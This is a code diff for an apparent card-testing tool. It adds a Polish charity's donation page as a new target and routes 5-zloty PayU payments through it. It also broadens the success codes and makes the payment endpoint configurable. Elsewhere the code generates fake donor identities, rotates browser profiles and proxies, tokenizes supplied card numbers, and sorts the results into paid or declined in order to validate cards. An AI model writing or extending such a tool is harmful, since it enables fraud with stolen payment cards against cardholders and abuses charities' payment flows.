@@ -278,6 +278,28 @@ PAYU_SITES = {
             "flexible_donation[send_donation]": "Wy\u015blij darowizn\u0119",
         },
     },
+    "eswip": {
+        "create_url": "https://www.eswip.pl/przekaz-datek",
+        "create_type": "form_nonce",
+        "nonce_field": "_token",
+        "nonce_pattern": r'name="_token" type="hidden" value="([^"]+)"',
+        "referer": "https://www.eswip.pl/przekaz-datek",
+        "origin": "https://www.eswip.pl",
+        "payu_base": "https://merch-prod.snd.payu.com",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "form_fields": {
+            "amount_selected": "",
+            "amount_entered": "5",
+            "name": "{first} {last}",
+            "email": "{email}",
+        },
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -323,6 +345,8 @@ def parse_card(cc: str) -> Tuple[str, str, str, str]:
 PAYU_RESULT_MAP = {
     # outcome
     "SUCCESS": "ORDER_PAID",
+    "AUTHORIZED": "ORDER_PAID",
+    "COMPLETED": "ORDER_PAID",
     # declines
     "CARD_INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
     "CARD_EXPIRED": "EXPIRE_CARD",
@@ -405,6 +429,8 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
     first, last, email = generate_identity()
     full_name = f"{first} {last}"
     cfg = PAYU_SITES.get(site, PAYU_SITES["centaurus"])
+    base = cfg.get("payu_base") or PAYU_BASE
+    pay_url = base + "/pay/"
 
     impersonate = random.choice(BROWSER_PROFILES)
     user_agent = PROFILE_UA[impersonate]
@@ -535,16 +561,16 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
             raise Exception("create order: missing orderId/token in redirect")
 
         auth = {"Authorization": f"Bearer {token}"}
-        payu_referer = PAYU_PAY_URL + "?orderId=" + order_id + "&token=" + urllib.parse.quote(token) + "&lang=en"
+        payu_referer = pay_url + "?orderId=" + order_id + "&token=" + urllib.parse.quote(token) + "&lang=en"
         api_headers = {
             "Authorization": f"Bearer {token}",
             "Content-Type": "application/json",
-            "Origin": PAYU_BASE,
+            "Origin": base,
             "Referer": payu_referer,
         }
 
         # 2. fetch order details -> authoritative amount (minor units) + currency
-        r = await s.get(f"{PAYU_BASE}/api/front/orders/{order_id}", headers=auth)
+        r = await s.get(f"{base}/api/front/orders/{order_id}", headers=auth)
         if r.status_code != 200:
             raise Exception(f"order fetch failed: HTTP {r.status_code}")
         order = r.json()
@@ -562,7 +588,7 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                 "expirationYear": year,
             },
         }
-        r = await s.post(f"{PAYU_BASE}/api/front/tokens", json=token_payload, headers=api_headers)
+        r = await s.post(f"{base}/api/front/tokens", json=token_payload, headers=api_headers)
         if r.status_code != 200:
             raise Exception(f"tokenize failed: HTTP {r.status_code}")
         tok = r.json()
@@ -584,14 +610,14 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                 "cardDetails": {"maskedCardNumber": masked},
             },
             "metadata": {"cardInputTime": random.randint(3000, 8000)},
-            "redirectUrl": PAYU_PAY_URL + "?orderId=" + order_id + "&token=%token%" + cfg["lang_param"],
+            "redirectUrl": pay_url + "?orderId=" + order_id + "&token=%token%" + cfg["lang_param"],
             "mcpFxTableId": cfg["mcp_fx_table_id"],
             "mcpFxRate": cfg["mcp_fx_rate"],
             "browserData": _browser_data(user_agent, cfg["timezone_offset"]),
             "language": cfg["language"],
             "invoice": None,
         }
-        r = await s.post(f"{PAYU_BASE}/api/front/orders/{order_id}/payments", json=pay_payload, headers=api_headers)
+        r = await s.post(f"{base}/api/front/orders/{order_id}/payments", json=pay_payload, headers=api_headers)
         if r.status_code != 200:
             body = ""
             try:
@@ -614,7 +640,7 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
 
         if auth_id:
             for _ in range(10):
-                r = await s.get(f"{PAYU_BASE}/api/threeds/authentications/{auth_id}", headers=auth)
+                r = await s.get(f"{base}/api/threeds/authentications/{auth_id}", headers=auth)
                 if r.status_code != 200:
                     break
                 auth_resp = r.json()
@@ -630,7 +656,7 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
         # 6. poll the final status until a terminal category (SUCCESS/ERROR)
         value = ""
         for _ in range(12):
-            r = await s.get(f"{PAYU_BASE}/api/front/orders/{order_id}/status", headers=auth)
+            r = await s.get(f"{base}/api/front/orders/{order_id}/status", headers=auth)
             if r.status_code != 200:
                 raise Exception(f"status fetch failed: HTTP {r.status_code}")
             status_resp = r.json()
